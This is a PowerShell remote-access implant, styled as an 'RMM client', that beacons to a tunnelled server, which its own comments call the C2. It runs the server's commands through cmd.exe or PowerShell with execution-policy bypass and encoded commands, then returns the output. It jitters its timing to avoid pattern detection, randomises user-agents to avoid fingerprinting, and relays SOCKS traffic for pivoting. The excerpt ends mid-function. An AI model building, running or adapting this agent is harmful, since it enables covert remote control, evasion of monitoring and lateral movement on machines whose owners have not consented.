# Enhanced RMM PowerShell Client with Dynamic Configuration
#
# Edit the variables in the configuration block below. Optional environment overrides
# (RMM_BASE_URL, RMM_BEACON_SECRET, …) are applied immediately after that block.

# -----------------------------------------------------------------------------
# Configuration — edit these variables
# -----------------------------------------------------------------------------
#
# Server
#   $u                 RMM server base URL (no trailing slash).
#   $beaconSecret       Shared beacon token; must match server RMM_BEACON_SECRET.
#                       Leave empty only if the server runs with --insecure.
#
# Session identity
#   $sessionId          Beacon session GUID (new ID each run unless you set a fixed value).
#
# Beacon timing (server may override at runtime via __CONFIG__)
#   $baseSleepSeconds   Poll interval in seconds.
#   $jitterPercent      Random +/- percent applied to sleep and backoff.
#   $maxRetries         Short backoff cycles before a longer pause on errors.
#
# HTTP transport
#   $persistentHttp     $true = reuse TCP + cookies across requests.
#   $httpProxy           Outbound proxy URI, e.g. http://proxy.corp:8080 (empty = direct).
#   $httpProxyUseDefaultCredentials
#                       $true = use Windows logon for proxy authentication (NTLM/Kerberos).
#
# Diagnostics
#   $verboseHttp         $true = log each request URL, wire IPv4, status, and error bodies.
#
# HTTP notes (not separate settings):
#   - Tunnel host is always reached over IPv4 (A records only; no IPv6-only DNS).
#   - Default transport closes TCP after each request unless $persistentHttp is $true.

$u = 'REPLACE-WITH-YOUR-CLOUDFLARED-URL'
$beaconSecret = ''
$sessionId = [System.Guid]::NewGuid().ToString()

$baseSleepSeconds = 60
$jitterPercent = 30
$maxRetries = 3

$persistentHttp = $false
$httpProxy = ''
$httpProxyUseDefaultCredentials = $false

$verboseHttp = $false

# -----------------------------------------------------------------------------
# Optional environment overrides (when set, they replace the variables above)
# -----------------------------------------------------------------------------
if ($env:RMM_BASE_URL -and $env:RMM_BASE_URL.Trim().Length -gt 0) {
    $u = $env:RMM_BASE_URL.Trim().TrimEnd('/')
}
if ($env:RMM_BEACON_SECRET -and $env:RMM_BEACON_SECRET.Trim().Length -gt 0) {
    $beaconSecret = $env:RMM_BEACON_SECRET.Trim()
}
if ($env:RMM_VERBOSE -and $env:RMM_VERBOSE.Trim() -match '^(?i)(1|true|yes|on)$') {
    $verboseHttp = $true
}
if ($env:RMM_PERSISTENT_HTTP -and $env:RMM_PERSISTENT_HTTP.Trim().Length -gt 0) {
    $persistentHttp = $env:RMM_PERSISTENT_HTTP.Trim() -match '^(?i)(1|true|yes|on)$'
}
if ($env:RMM_HTTP_PROXY -and $env:RMM_HTTP_PROXY.Trim().Length -gt 0) {
    $httpProxy = $env:RMM_HTTP_PROXY.Trim()
}
if ($env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS -and
    $env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS.Trim() -match '^(?i)(1|true|yes|on)$') {
    $httpProxyUseDefaultCredentials = $true
}

# -----------------------------------------------------------------------------
# Derived runtime state (do not edit unless you know why)
# -----------------------------------------------------------------------------
if ($u -match 'REPLACE-WITH-YOUR-CLOUDFLARED-URL') {
    Write-Host "[-] Set `$u in this script or set environment variable RMM_BASE_URL (no trailing slash)." -ForegroundColor Red
    exit 1
}

$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$currentRetry = 0
$script:RmmEverRegistered = $false
$script:RmmVerbose = [bool]$verboseHttp
$script:UsePersistentHttp = [bool]$persistentHttp
$script:RmmShellCwd = (Get-Location).Path
$script:RmmSocksEnabled = $false
$script:RmmSocksConnections = @{}

if ($script:UsePersistentHttp) {
    $script:RmmCookieContainer = New-Object System.Net.CookieContainer
} else {
    $script:RmmCookieContainer = $null
}

$script:RmmWebProxy = $null
if ($httpProxy -and $httpProxy.Trim().Length -gt 0) {
    try {
        $script:RmmWebProxy = New-Object System.Net.WebProxy ($httpProxy.Trim())
        $script:RmmWebProxy.BypassProxyOnLocal = $false
        if ($httpProxyUseDefaultCredentials) {
            $script:RmmWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        }
    } catch {
        Write-Host "[-] Invalid `$httpProxy: $httpProxy — $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

function Write-RmmLog {
    param(
        [Parameter(Mandatory = $true)][string]$Message,
        [ValidateSet('INFO', 'WARN', 'ERROR', 'DEBUG')][string]$Level = 'INFO'
    )
    if ($Level -eq 'DEBUG' -and -not $script:RmmVerbose) { return }
    $color = switch ($Level) {
        'WARN'  { 'Yellow' }
        'ERROR' { 'Red' }
        'DEBUG' { 'DarkGray' }
        default { 'Gray' }
    }
    $prefix = switch ($Level) {
        'DEBUG' { '[dbg]' }
        'WARN'  { '[!]' }
        'ERROR' { '[-]' }
        default { '[*]' }
    }
    Write-Host "$prefix $Message" -ForegroundColor $color
}

function Get-RmmHttpErrorBody {
    param([System.Net.HttpWebResponse]$Response)
    if (-not $Response) { return '' }
    try {
        $stream = $Response.GetResponseStream()
        if (-not $stream) { return '' }
        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
        $text = $reader.ReadToEnd()
        $reader.Close()
        try { $Response.Close() } catch {}
        return ([string]$text).Trim()
    } catch {
        return ''
    }
}

function Get-RmmHttpStatusHint {
    param([int]$StatusCode)
    switch ($StatusCode) {
        401 { return 'Unauthorized — wrong or missing X-RMM-Beacon-Token (RMM_BEACON_SECRET).' }
        403 { return 'Forbidden — session killed or beacon secret rejected.' }
        404 { return 'Not found — check RMM_BASE_URL path.' }
        502 { return 'Bad gateway — tunnel/origin down (is cloudflared + server_rmm.py running?).' }
        503 { return 'Service unavailable — origin not ready.' }
        524 { return 'Cloudflare timeout — origin did not answer in time (cloudflared cannot reach server_rmm.py on 127.0.0.1:8080?).' }
        default { return '' }
    }
}

function Write-RmmHttpFailure {
    param(
        [Parameter(Mandatory = $true)]$ErrorRecord,
        [string]$Context = ''
    )
    $ex = $ErrorRecord.Exception
    if ($ex.InnerException -is [System.Net.WebException]) {
        $ex = $ex.InnerException
    }
    $status = 0
    $body = ''
    if ($ex -is [System.Net.WebException] -and $ex.Response) {
        $status = [int]$ex.Response.StatusCode
        $body = Get-RmmHttpErrorBody -Response $ex.Response
    }
    $head = if ($Context) { "$Context — " } else { '' }
    if ($status -gt 0) {
        Write-RmmLog ("{0}HTTP {1} ({2})" -f $head, $status, $ex.Message) -Level ERROR
        $hint = Get-RmmHttpStatusHint -StatusCode $status
        if ($hint) { Write-RmmLog $hint -Level WARN }
    } else {
        Write-RmmLog ("{0}{1}" -f $head, $ex.Message) -Level ERROR
    }
    if ($body) {
        $preview = if ($body.Length -gt 300) { $body.Substring(0, 300) + '...' } else { $body }
        Write-RmmLog "Response body: $preview" -Level DEBUG
    }
    if ($status -eq 0 -and $ex.Message -match 'actively refused') {
        Write-RmmLog "Nothing listening at that host:port on this machine. Start server_rmm.py or fix RMM_BASE_URL." -Level WARN
    }
}

function Get-RmmRequestHeaders {
    param([string]$UserAgent = (Get-RandomUserAgent))
    $h = @{
        "User-Agent" = $UserAgent
        "Accept" = "*/*"
        "Cache-Control" = "no-cache"
    }
    if ($beaconSecret) {
        $h["X-RMM-Beacon-Token"] = $beaconSecret
    }
    return $h
}

function Resolve-RmmTunnelIpv4 {
    param([Parameter(Mandatory = $true)][System.Uri]$Uri)
    $hostPart = $Uri.Host
    if ($hostPart -match '^\[.*\]$') {
        throw "RMM: IPv6 URL hosts are not supported. Use the tunnel hostname or an IPv4 address."
    }
    $parsed = $null
    if ([System.Net.IPAddress]::TryParse($hostPart, [ref]$parsed)) {
        if ($parsed.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork) {
            return @{ Ipv4 = $parsed; OriginalHost = $hostPart }
        }
        if ($parsed.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetworkV6) {
            throw "RMM: IPv6 address in URL is not supported. Use a hostname with an A record or an IPv4 literal."
        }
    }
    $ipv4 = $null
    foreach ($a in [System.Net.Dns]::GetHostAddresses($hostPart)) {
        if ($a.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork) {
            $ipv4 = $a
            break
        }
    }
    if ($null -eq $ipv4) {
        throw "RMM: No IPv4 address for host '$hostPart' (IPv6-only or unresolved). The client cannot use IPv6 to reach the tunnel."
    }
    return @{ Ipv4 = $ipv4; OriginalHost = $hostPart }
}

function Convert-RmmHttpResponseContent {
    param(
        [string]$Raw,
        [string]$ContentType
    )
    if ($null -eq $Raw) { return $null }
    $trim = $Raw.Trim()
    if ($trim.Length -eq 0) { return $null }
    $ct = if ($ContentType) { $ContentType } else { '' }
    $looksJson = ($ct -match 'json') -or ($trim.StartsWith('{')) -or ($trim.StartsWith('['))
    if ($looksJson) {
        try {
            return $Raw | ConvertFrom-Json
        } catch {
            return $Raw
        }
    }
    return $Raw
}

function Invoke-RmmRestMethod {
    param(
        [Parameter(Mandatory = $true)][string]$Uri,
        [ValidateSet('Get', 'Post')][string]$Method = 'Get',
        [object]$Body,
        [string]$ContentType,
        [hashtable]$Headers = @{},
        [ValidateSet('Continue', 'Stop', 'SilentlyContinue', 'Ignore')][string]$RestErrorAction = 'Continue'
    )
    if ($null -eq $Headers) { $Headers = @{} }

    $origUri = $null
    try {
        $origUri = [System.Uri]::new($Uri)
    } catch {
        if ($RestErrorAction -eq 'Stop') { throw }
        return $null
    }

    $resolved = $null
    try {
        $resolved = Resolve-RmmTunnelIpv4 -Uri $origUri
    } catch {
        if ($RestErrorAction -eq 'Stop') { throw }
        return $null
    }

    $builder = New-Object System.UriBuilder $origUri
    $builder.Host = $resolved.Ipv4.ToString()
    $wireUri = $builder.Uri

    $proxyNote = if ($script:RmmWebProxy) { " Proxy=$httpProxy" } else { '' }
    Write-RmmLog "$Method $origUri -> wire $($resolved.Ipv4) Host=$($resolved.OriginalHost) KeepAlive=$($script:UsePersistentHttp)$proxyNote" -Level DEBUG

    $req = [System.Net.HttpWebRequest]::Create($wireUri)
    $req.Method = $Method
    $req.Host = $resolved.OriginalHost
    $req.AllowAutoRedirect = $true
    $req.Timeout = 300000
    # Default: HTTP keep-alive off so each request tends to close the TCP flow after the exchange (Wireshark-friendly).
    # Persistent mode: keep-alive on so one TCP can carry multiple requests.
    $req.KeepAlive = [bool]$script:UsePersistentHttp
    if ($script:RmmWebProxy) {
        $req.Proxy = $script:RmmWebProxy
    }
    if ($script:UsePersistentHttp -and $script:RmmCookieContainer) {
        $req.CookieContainer = $script:RmmCookieContainer
    }

    foreach ($key in $Headers.Keys) {
        $name = [string]$key
        $val = [string]$Headers[$key]
        if ($name -match '(?i)^(User-Agent)$') {
            $req.UserAgent = $val
        } elseif ($name -match '(?i)^(Accept)$') {
            $req.Accept = $val
        } elseif ($name -match '(?i)^(Host|Connection)$') {
            continue
        } else {
            try {
                [void]$req.Headers.Add($name, $val)
            } catch {
                try {
                    $req.Headers[$name] = $val
                } catch {
                }
            }
        }
    }

    if ($Method -eq 'Post' -and $null -ne $Body) {
        if ($ContentType) {
            $req.ContentType = $ContentType
        } else {
            $req.ContentType = 'text/plain; charset=utf-8'
        }
        $enc = [System.Text.Encoding]::UTF8
        $bytes = $enc.GetBytes([string]$Body)
        $req.ContentLength = $bytes.Length
        $ws = $req.GetRequestStream()
        try {
            $ws.Write($bytes, 0, $bytes.Length)
        } finally {
            $ws.Close()
        }
    }

    try {
        $response = $req.GetResponse()
        $http = [System.Net.HttpWebResponse]$response
        $statusNum = [int]$http.StatusCode
        if ($statusNum -ge 400) {
            $errBody = Get-RmmHttpErrorBody -Response $http
            $hint = Get-RmmHttpStatusHint -StatusCode $statusNum
            $msg = "The remote server returned an error: ($statusNum) $($http.StatusCode)."
            if ($hint) { $msg += " $hint" }
            if ($errBody) {
                $prev = if ($errBody.Length -gt 200) { $errBody.Substring(0, 200) + '...' } else { $errBody }
                $msg += " Body: $prev"
            }
            Write-RmmLog "HTTP $statusNum on $Method $origUri — $msg" -Level ERROR
            throw [System.Net.WebException]::new(
                $msg,
                $null,
                [System.Net.WebExceptionStatus]::ProtocolError,
                $http)
        }
        $rs = $http.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($rs, [System.Text.Encoding]::UTF8)
        $raw = $reader.ReadToEnd()
        $reader.Close()
        $ctOut = $http.ContentType
        $http.Close()
        Write-RmmLog "HTTP $statusNum $Method $origUri ($($raw.Length) bytes)" -Level DEBUG
        return (Convert-RmmHttpResponseContent -Raw $raw -ContentType $ctOut)
    } catch [System.Net.WebException] {
        $we = $_.Exception
        $eb = ''
        $logLevel = if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore') { 'DEBUG' } else { 'ERROR' }
        if ($we.Response) {
            $st = [int]$we.Response.StatusCode
            Write-RmmLog "WebException HTTP $st on $Method $origUri — $($we.Message)" -Level $logLevel
            $hint = Get-RmmHttpStatusHint -StatusCode $st
            if ($hint) { Write-RmmLog $hint -Level $(if ($logLevel -eq 'DEBUG') { 'DEBUG' } else { 'WARN' }) }
            $eb = Get-RmmHttpErrorBody -Response $we.Response
            if ($eb) {
                $pv = if ($eb.Length -gt 300) { $eb.Substring(0, 300) + '...' } else { $eb }
                Write-RmmLog "Response body: $pv" -Level DEBUG
            }
        } else {
            Write-RmmLog "WebException on $Method $origUri — $($we.Message)" -Level $logLevel
        }
        $enriched = $we.Message
        if ($we.Response) {
            $st = [int]$we.Response.StatusCode
            $hint = Get-RmmHttpStatusHint -StatusCode $st
            if ($hint) { $enriched += " $hint" }
        }
        if ($eb) {
            $prev = if ($eb.Length -gt 200) { $eb.Substring(0, 200) + '...' } else { $eb }
            $enriched += " Body: $prev"
        }
        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
            return $null
        }
        throw [System.Exception]::new($enriched, $we)
    } catch {
        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
            return $null
        }
        throw
    }
}

# Jitter function - adds random delay to avoid pattern detection
function Get-JitteredSleep {
    param(
        [int]$baseSeconds,
        [int]$jitterPercent
    )
    
    # Calculate jitter range
    $jitterRange = [int]($baseSeconds * ($jitterPercent / 100))
    $jitterValue = Get-Random -Minimum (-$jitterRange) -Maximum ($jitterRange + 1)
    $actualSleep = [Math]::Max(1, $baseSeconds + $jitterValue)
    
    # Add micro-jitter for additional randomness (milliseconds)
    $microJitter = Get-Random -Minimum 100 -Maximum 1000
    $totalMilliseconds = ($actualSleep * 1000) + $microJitter
    
    Write-Host "[*] Sleeping for $actualSleep.$microJitter seconds (base: $baseSeconds, jitter: $jitterValue sec, micro: $microJitter ms)" -ForegroundColor DarkGray
    
    # Sleep using milliseconds only
    Start-Sleep -Milliseconds $totalMilliseconds
    return $actualSleep
}

# Exponential backoff for retries
function Get-BackoffSleep {
    param([int]$retryCount)
    
    # Cap retryCount to prevent overflow
    $cappedRetry = [Math]::Min($retryCount, 10)
    
    # Calculate backoff using integer math
    $backoffSeconds = 1
    for ($i = 0; $i -lt $cappedRetry; $i++) {
        $backoffSeconds = $backoffSeconds * 2
        if ($backoffSeconds -gt 60) {
            $backoffSeconds = 60
            break
        }
    }
    
    # Ensure backoff is within bounds
    $backoffSeconds = [Math]::Max(1, [Math]::Min(60, $backoffSeconds))
    
    # Add jitter to backoff
    $jitteredBackoff = Get-JitteredSleep -baseSeconds $backoffSeconds -jitterPercent 30
    return $jitteredBackoff
}

# Update configuration from server (idle __CONFIG__ no-op returns early without log noise).
function Update-Configuration {
    param([string]$configString)
    
    $parts = $configString -split " "
    if ($parts.Count -ge 3) {
        try {
            $newSleep = [int]$parts[1]
            $newJitter = [int]$parts[2]
            # Server sends __CONFIG__ on every idle /cmd; skip logs and work when nothing changed.
            if ($newSleep -eq $script:baseSleepSeconds -and $newJitter -eq $script:jitterPercent -and
                $newSleep -ge 1 -and $newSleep -le 3600 -and $newJitter -ge 0 -and $newJitter -le 100) {
                return
            }
            
            Write-Host "[*] Processing configuration update: $configString" -ForegroundColor Cyan
            
            $changed = $false
            
            # Validate ranges
            if ($newSleep -ge 1 -and $newSleep -le 3600) {
                if ($newSleep -ne $script:baseSleepSeconds) {
                    $script:baseSleepSeconds = $newSleep
                    $changed = $true
                    Write-Host "[+] Sleep interval updated to $baseSleepSeconds seconds" -ForegroundColor Green
                }
            } else {
                Write-Host "[-] Invalid sleep value: $newSleep (must be 1-3600)" -ForegroundColor Red
            }
            
            if ($newJitter -ge 0 -and $newJitter -le 100) {
                if ($newJitter -ne $script:jitterPercent) {
                    $script:jitterPercent = $newJitter
                    $changed = $true
                    Write-Host "[+] Jitter updated to $jitterPercent%" -ForegroundColor Green
                }
            } else {
                Write-Host "[-] Invalid jitter value: $newJitter (must be 0-100)" -ForegroundColor Red
            }
            
            # Send acknowledgment only when values actually changed (server sends __CONFIG__ every idle poll)
            if ($changed) {
                try {
                    $ackUrl = "$u/result?id=$sessionId&type=config_ack"
                    $ackBody = "Configuration updated: Sleep=$baseSleepSeconds, Jitter=$jitterPercent%"
                    $ackHeaders = Get-RmmRequestHeaders
                    $ackResult = Invoke-RmmRestMethod -Uri $ackUrl -Method Post -Body $ackBody -Headers $ackHeaders -RestErrorAction SilentlyContinue
                    if ($null -ne $ackResult) {
                        Write-Host "[+] Configuration acknowledgment sent" -ForegroundColor DarkGray
                    } else {
                        Write-RmmLog "Configuration acknowledgment failed (server rejected POST /result)" -Level WARN
                    }
                } catch {
                    Write-RmmLog "Configuration acknowledgment failed: $($_.Exception.Message)" -Level WARN
                }
            }
        } catch {
            Write-Host "[-] Failed to parse configuration: $_" -ForegroundColor Red
        }
    }
}

# Helper function for Base64 encoding
function ConvertTo-Base64 {
    param([string]$text)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
    return [Convert]::ToBase64String($bytes)
}

function ConvertFrom-Base64 {
    param([string]$base64)
    $bytes = [Convert]::FromBase64String($base64)
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}

# Randomized User-Agent to avoid fingerprinting
function Get-RandomUserAgent {
    $userAgents = @(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
    )
    return $userAgents | Get-Random
}

# Safe JSON parser — Invoke-RestMethod already deserializes JSON to PSCustomObject
function Parse-CmdResponse {
    param($response)
    if ($null -eq $response) {
        return @{ command = ""; type = "none" }
    }
    if ($response -is [string]) {
        try {
            $o = $response | ConvertFrom-Json
            return Parse-CmdResponse -response $o
        } catch {
            Write-Host "[!] Received non-JSON string, treating as plain command" -ForegroundColor Yellow
            return @{ command = $response; type = "execute" }
        }
    }
    $cmd = $null
    $typ = $null
    foreach ($p in $response.PSObject.Properties) {
        if ($p.Name -match '^(?i)command$') { $cmd = [string]$p.Value }
        elseif ($p.Name -match '^(?i)type$') { $typ = [string]$p.Value }
    }
    if ($null -eq $cmd) { $cmd = '' }
    if ($null -eq $typ) {
        $typ = if ([string]::IsNullOrWhiteSpace($cmd)) { 'none' } else { 'execute' }
    }
    return @{ command = $cmd; type = $typ }
}

# Text results include the originating command so the C2 can label output when the queue has many items.
function Send-RmmTextResult {
    param(
        [Parameter(Mandatory = $true)][string]$CommandLine,
        [Parameter(Mandatory = $true)][string]$Text,
        [hashtable]$Headers = @{}
    )
    $uri = "$u/result?id=$sessionId"
    $payload = [ordered]@{ rmm_cmd = $CommandLine; rmm_output = $Text }
    $json = $payload | ConvertTo-Json -Compress -Depth 10
    Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
}

function Stop-RmmSocksRelay {
    foreach ($id in @($script:RmmSocksConnections.Keys)) {
        $tcp = $script:RmmSocksConnections[$id]
        if ($tcp) {
            try { $tcp.Close() } catch { }
        }
        $script:RmmSocksConnections.Remove($id) | Out-Null
    }
    $script:RmmSocksEnabled = $false
}

function Invoke-RmmSocksCycle {
    param([hashtable]$Headers)
    if (-not $script:RmmSocksEnabled) { return }
    $pollUrl = "$u/socks?id=$sessionId"
    $poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $Headers -RestErrorAction SilentlyContinue
    if ($null -eq $poll) { return }
    $tasks = @()
    if ($poll -is [string]) {
        try { $poll = $poll | ConvertFrom-Json } catch { return }
    }
    if ($poll.tasks) { $tasks = @($poll.tasks) }
    $responses = New-Object System.Collections.ArrayList
    foreach ($task in $tasks) {
        $op = [string]$task.op
        $tid = [string]$task.id
        if (-not $tid) { continue }
        if ($op -eq 'connect') {
            $destHost = [string]$task.host
            $port = [int]$task.port
            try {
                $tcp = New-Object System.Net.Sockets.TcpClient
                $tcp.ReceiveTimeout = 5000
                $tcp.SendTimeout = 5000
                $tcp.Connect($destHost, $port)
                $script:RmmSocksConnections[$tid] = $tcp
                [void]$responses.Add(@{ id = $tid; op = 'ok' })
            } catch {
                [void]$responses.Add(@{ id = $tid; op = 'error'; msg = $_.Exception.Message })
            }
        }
        elseif ($op -eq 'send') {
            $tcp = $script:RmmSocksConnections[$tid]
            if (-not $tcp) { continue }
            try {
                $raw = [Convert]::FromBase64String([string]$task.data_b64)
                $stream = $tcp.GetStream()
                $stream.Write($raw, 0, $raw.Length)
            } catch {
                try { $tcp.Close() } catch { }
                $script:RmmSocksConnections.Remove($tid) | Out-Null
                [void]$responses.Add(@{ id = $tid; op = 'closed' })
            }
        }
        elseif ($op -eq 'close') {
            $tcp = $script:RmmSocksConnections[$tid]
            if ($tcp) {
                try { $tcp.Close() } catch { }
            }
            $script:RmmSocksConnections.Remove($tid) | Out-Null
        }
    }
    foreach ($tid in @($script:RmmSocksConnections.Keys)) {
        $tcp = $script:RmmSocksConnections[$tid]
        if (-not $tcp) { continue }
        try {
            if (-not $tcp.Connected) {
                $script:RmmSocksConnections.Remove($tid) | Out-Null
                [void]$responses.Add(@{ id = $tid; op = 'closed' })
                continue
            }
            $stream = $tcp.GetStream()
            if ($stream.DataAvailable) {
                $buf = New-Object byte[] 16384
                $n = $stream.Read($buf, 0, $buf.Length)
                if ($n -le 0) {
                    $tcp.Close()
                    $script:RmmSocksConnections.Remove($tid) | Out-Null
                    [void]$responses.Add(@{ id = $tid; op = 'closed' })
                } else {
                    $chunk = [Convert]::ToBase64String($buf, 0, $n)
                    [void]$responses.Add(@{ id = $tid; op = 'data'; data_b64 = $chunk })
                }
            }
        } catch {
            try { $tcp.Close() } catch { }
            $script:RmmSocksConnections.Remove($tid) | Out-Null
            [void]$responses.Add(@{ id = $tid; op = 'closed' })
        }
    }
    if ($responses.Count -gt 0) {
        $body = @{ responses = @($responses) } | ConvertTo-Json -Compress -Depth 6
        $postUrl = "$u/socks?id=$sessionId"
        Invoke-RmmRestMethod -Uri $postUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue | Out-Null
    }
}

# 2>&1 on native exes turns stderr into ErrorRecord; Out-String then dumps script position noise.
function ConvertTo-RmmPlainText {
    param([object[]]$Chunks)
    if ($null -eq $Chunks -or $Chunks.Count -eq 0) { return '' }
    ($Chunks | ForEach-Object {
        if ($_ -is [System.Management.Automation.ErrorRecord]) {
            $_.Exception.Message.TrimEnd()
        } elseif ($_ -is [System.Exception]) {
            $_.Message
        } else {
            "$_"
        }
    }) -join [Environment]::NewLine
}

function Apply-RmmCwdFromCmdOutput {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $Text }
    $last = $null
    $kept = New-Object System.Collections.ArrayList
    foreach ($line in ($Text -split "`r?`n")) {
        if ($line -match '^\s*RMM_CWD_SIG:(.+)\s*$') {
            $last = $Matches[1].Trim()
            continue
        }
        [void]$kept.Add($line)
    }
    if ($last) {
        try {
            if (Test-Path -LiteralPath $last -PathType Container) {
                $script:RmmShellCwd = (New-Object System.IO.DirectoryInfo -ArgumentList $last).FullName
            }
        } catch { }
    }
    return ($kept -join [Environment]::NewLine).TrimEnd()
}

function Get-RmmPlainCmdOutput {
    param([Parameter(Mandatory)][string]$InnerCommand)
    $base = $script:RmmShellCwd
    if (-not (Test-Path -LiteralPath $base -PathType Container)) {
        $base = $env:USERPROFILE
        $script:RmmShellCwd = $base
    }
    $baseQ = '"' + ($base.Trim() -replace '"', '""') + '"'
    $combined = 'cd /d ' + $baseQ + ' & ' + $InnerCommand + ' & echo RMM_CWD_SIG:%CD%'
    $stdoutFile = [System.IO.Path]::GetTempFileName()
    $stderrFile = [System.IO.Path]::GetTempFileName()
    try {
        $proc = Start-Process -FilePath 'cmd.exe' -ArgumentList @('/d', '/c', $combined) `
            -Wait -NoNewWindow -PassThru `
            -RedirectStandardOutput $stdoutFile -RedirectStandardError $stderrFile
        $so = [System.IO.File]::ReadAllText($stdoutFile)
        $se = [System.IO.File]::ReadAllText($stderrFile)
        $parts = @()
        if ($so.TrimEnd().Length) { $parts += $so.TrimEnd() }
        if ($se.TrimEnd().Length) { $parts += $se.TrimEnd() }
        $text = $parts -join [Environment]::NewLine
        if ($proc.ExitCode -ne 0 -and -not $text.Trim()) {
            $text = "(cmd exited with code $($proc.ExitCode))"
        }
        return (Apply-RmmCwdFromCmdOutput -Text $text)
    } finally {
        Remove-Item -LiteralPath $stdoutFile, $stderrFile -Force -ErrorAction SilentlyContinue
    }
}

# Default: cmd.exe. Prefix PS: or powershell: for Windows PowerShell; pwsh: for PS 7 if installed.
# Prefix cmd: forces CMD. Uses -EncodedCommand for PS so quotes and pipelines are reliable.

# CMD does not treat '...' as quoting (unlike bash); convert simple 'segment' pairs to "segment" for net, etc.
function Convert-RmmCmdSingleQuotesForCmd {
    param([string]$Line)
    if ([string]::IsNullOrEmpty($Line)) { return $Line }
    $sb = New-Object System.Text.StringBuilder
    $i = 0
    $len = $Line.Length
    $sq = [char]39
    while ($i -lt $len) {
        if ($Line[$i] -eq $sq) {
            $end = $Line.IndexOf($sq, $i + 1)
            if ($end -lt 0) {
                [void]$sb.Append($Line[$i])
                $i++
                continue
            }
            $inner = $Line.Substring($i + 1, $end - $i - 1)
            $innerEsc = $inner -replace '"', '""'
            [void]$sb.Append('"').Append($innerEsc).Append('"')
            $i = $end + 1
        } else {
            [void]$sb.Append($Line[$i])
            $i++
        }
    }
    return $sb.ToString()
}

function Normalize-RmmCmdExeLine {
    param([string]$Line)
    $t = $Line.Trim()
    # CMD has no `ls`; map common Unix habit so operators are not punished.
    if ($t -match '^(?i)ls$') { return 'dir' }
    return (Convert-RmmCmdSingleQuotesForCmd -Line $Line)
}

function Invoke-RmmUserCommand {
    param([Parameter(Mandatory = $true)][string]$RawCommand)
    $trimmed = $RawCommand.TrimStart()
    try {
        if ($trimmed -match '^(?i)(?:powershell|ps)\s*:\s*(.*)$') {
            $inner = $Matches[1]
            if ([string]::IsNullOrWhiteSpace($inner)) { return 'Error: empty script after PS: or powershell:' }
            $wdEsc = $script:RmmShellCwd -replace "'", "''"
            $innerPs = "Set-Location -LiteralPath '$wdEsc' -ErrorAction SilentlyContinue`r`n" + $inner + "`r`nWrite-Output ('RMM_CWD_SIG:' + (Get-Location).Path)"
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($innerPs))
            $out = & powershell.exe @(
                '-NoProfile', '-ExecutionPolicy', 'Bypass', '-NoLogo', '-NonInteractive',
                '-EncodedCommand', $enc
            ) 2>&1
            $txt = [string](ConvertTo-RmmPlainText @($out))
            return (Apply-RmmCwdFromCmdOutput -Text $txt)
        }
        if ($trimmed -match '^(?i)pwsh\s*:\s*(.*)$') {
            $inner = $Matches[1]
            if ([string]::IsNullOrWhiteSpace($inner)) { return 'Error: empty script after pwsh:' }
            $wdEsc = $script:RmmShellCwd -replace "'", "''"
            $innerPs = "Set-Location -LiteralPath '$wdEsc' -ErrorAction SilentlyContinue`r`n" + $inner + "`r`nWrite-Output ('RMM_CWD_SIG:' + (Get-Location).Path)"
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($innerPs))
            $launcher = if (Get-Command pwsh.exe -ErrorAction SilentlyContinue) { 'pwsh.exe' } else { 'powershell.exe' }
            $out = & $launcher @(
                '-NoProfile', '-ExecutionPolicy', 'Bypass', '-NoLogo', '-NonInteractive',
                '-EncodedCommand', $enc
            ) 2>&1
            $txt = [string](ConvertTo-RmmPlainText @($out))
            return (Apply-RmmCwdFromCmdOutput -Text $txt)
        }
        if ($trimmed -match '^(?i)cmd\s*:\s*(.*)$') {
            return [string](Get-RmmPlainCmdOutput -InnerCommand (Normalize-RmmCmdExeLine -Line $Matches[1]))
        }
        return [string](Get-RmmPlainCmdOutput -InnerCommand (Normalize-RmmCmdExeLine -Line $RawCommand))
    } catch {
        return [string]$_.Exception.Message
    }
}

function Get-RmmWebExceptionResponse {
    param($ErrorRecord)
    $ex = $ErrorRecord.Exception
    if ($ex.InnerException -is [System.Net.WebException]) {
        $ex = $ex.InnerException
    }
    if ($ex -is [System.Net.WebException] -and $ex.Response) {
        return $ex.Response
    }
    return $null
}

function Test-RmmSessionTerminated {
    param($ErrorRecord)
    try {
        $resp = Get-RmmWebExceptionResponse -ErrorRecord $ErrorRecord
        if ($resp -and [int]$resp.StatusCode -eq 403) {
            $body = Get-RmmHttpErrorBody -Response $resp
            if ($body -match 'TERMINATED') { return $true }
        }
